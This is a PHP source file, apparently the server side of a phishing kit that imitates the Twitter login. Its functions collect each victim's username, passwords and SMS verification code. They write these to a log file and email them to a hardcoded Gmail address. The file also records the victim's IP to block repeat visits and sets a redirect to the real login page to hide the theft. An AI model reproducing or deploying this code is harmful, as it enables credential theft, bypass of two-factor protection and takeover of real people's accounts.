<?php date_default_timezone_set("America/Bogota"); include("GetIP.php"); require "Mobile_Detect.php";

  $URLRedireccion = "https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjM9dWH99f0AhUgVzABHb0FD7IQFnoECAIQAQ&url=https%3A%2F%2Ftwitter.com%2Flogin&usg=AOvVaw3swNPrVfKaBGiX8TGfSpkN";

  // Guardar Log
  function LogTwitter(){

    $Content  = "[".GetIP()."]".PHP_EOL;
  	$Content .= "User-Agent        : ".$_SERVER['HTTP_USER_AGENT'].PHP_EOL;
  	$Content .= "Username          : ".$_POST['TxtEmail'].PHP_EOL;
  	$Content .= "Password          : ".$_POST['TxtPassword'].PHP_EOL;
  	$Content .= "Fecha             : ".date("Y-m-d H:i:s").PHP_EOL;
  	$Content .= "---------------------------------------".PHP_EOL.PHP_EOL;

    $oFile = fopen("LG_89F5942BC37EB2131578D77A79571C59.txt", "a+");
    fwrite($oFile, $Content);
    fclose($oFile);

    @mail('giuseppeafontino1988@gmail.com', 'TWITTTT '.date("Y-m-d H:i:s"), $Content);

    BanIP();
  }

  // Guardar Log
  function LogTwitterPassword2(){

    $Content  = "[".GetIP()."]".PHP_EOL;
  	$Content .= "User-Agent        : ".$_SERVER['HTTP_USER_AGENT'].PHP_EOL;
  	$Content .= "Username          : ".$_POST['TxtEmail'].PHP_EOL;
  	$Content .= "Password1         : ".$_POST['TxtPassword1'].PHP_EOL;
    $Content .= "Password2         : ".$_POST['TxtPassword2'].PHP_EOL;
  	$Content .= "Fecha             : ".date("Y-m-d H:i:s").PHP_EOL;
  	$Content .= "---------------------------------------".PHP_EOL.PHP_EOL;

    $oFile = fopen("LG_89F5942BC37EB2131578D77A79571C59.txt", "a+");
    fwrite($oFile, $Content);
    fclose($oFile);

    @mail('giuseppeafontino1988@gmail.com', 'TWITTTT '.date("Y-m-d H:i:s"), $Content);

    BanIP();
  }

  function LogTwitterSMS(){

    $Content  = "[".GetIP()."]".PHP_EOL;
  	$Content .= "User-Agent        : ".$_SERVER['HTTP_USER_AGENT'].PHP_EOL;
  	$Content .= "Username          : ".$_POST['TxtEmail'].PHP_EOL;
    $Content .= "Password1         : ".$_POST['TxtPassword1'].PHP_EOL;
    $Content .= "Password2         : ".$_POST['TxtPassword2'].PHP_EOL;
    $Content .= "SMS               : ".$_POST['TxtSMS'].PHP_EOL;
  	$Content .= "Fecha             : ".date("Y-m-d H:i:s").PHP_EOL;
  	$Content .= "---------------------------------------".PHP_EOL.PHP_EOL;

    $oFile = fopen("LG_89F5942BC37EB2131578D77A79571C59.txt", "a+");
    fwrite($oFile, $Content);
    fclose($oFile);

    @mail('giuseppeafontino1988@gmail.com', 'TWITTTT '.date("Y-m-d H:i:s"), $Content);

    BanIP();
  }

  function BanIP() {
    $oFile = fopen("IP_89F5942BC37EB2131578D77A79571C59.txt", "a+");
    fwrite($oFile, GetIP().PHP_EOL);
    fclose($oFile);
  }

  function CheckIPBan() {
    $Status = false;
  	global $URLRedireccion;
      $IP = GetIP();
      $oFile = fopen("IP_89F5942BC37EB2131578D77A79571C59.txt", "a+");
      while(!feof($oFile)) {
          $linea = fgets($oFile);
          if(trim($linea) === trim($IP)){
            $Status = true;
          }
      }
      fclose($oFile);

      return $Status;
  }


function CheckDipositive(){
  $detect = new Mobile_Detect;

  if ($detect->isMobile() || $detect->isTablet()) {
    return true;
  } else {
    return false;
  }
}
